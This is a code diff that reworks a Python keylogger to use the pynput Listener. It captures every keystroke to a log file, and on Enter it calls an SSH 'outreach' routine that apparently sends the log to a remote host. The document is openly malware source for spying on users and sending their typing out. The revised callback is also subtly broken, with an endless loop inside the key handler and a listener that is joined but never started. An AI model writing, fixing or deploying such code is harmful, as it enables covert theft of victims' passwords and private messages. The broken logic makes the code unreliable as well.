@@ -1,8 +1,8 @@
 import os
-import string
-import time
-import keyboard
 import paramiko
+import pynput
+from pynput.keyboard import Listener
+
 
 
 def osDetect():
@@ -26,34 +26,27 @@ def outreach():
     ssh.close()
 
 
-def keylogger():
+def keylogger(Listener):
 
-    while True:
-        file = open('log.txt', 'a')
-
-        event = keyboard.read_event()
-
-        if event.event_type == keyboard.KEY_DOWN:
-            time.sleep(0.3)
-            char = keyboard.read_key()
-
-            if event.name == 'space':
-                space = ' '
-                file.write(space)
-                file.close()
-
-            elif event.name == 'enter':
-                enter = '\n'
-                file.write(enter)
-                file.close()
+    def on_press(key):
+        while True:
+            file = open('log.txt', 'a', encoding='utf-8')
+            k = str(key).replace("'", "")
+            if k.find("space") > 0:
+                file.write(" ")
+            elif k.find("enter") > 0:
+                file.write("\n")
                 outreach()
+            elif k.find("Key") == -1:
+                file.write(k)
+            file.close()
+            
+    Listener = Listener(on_press=on_press)
+    Listener.join()
 
-            else:
-                file.write(char)
-                file.close()
 
 
 
 if __name__ == '__main__':
 
-    keylogger()
+    keylogger(Listener)
